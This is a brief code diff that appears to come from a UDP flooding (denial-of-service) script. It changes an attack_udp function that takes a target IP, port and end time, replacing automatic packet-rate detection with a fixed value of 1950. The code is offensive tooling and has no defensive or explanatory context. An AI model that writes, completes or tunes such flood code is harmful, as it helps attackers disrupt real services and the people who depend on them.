@@ -47,7 +47,7 @@ def detect_max_packets():
 
 def attack_udp(ip, port, end_time, size):
     print("Attack started")
-    max_packets = detect_max_packets()
+    max_packets = 1950
     print("detected")
     
     while time.time() < end_time:
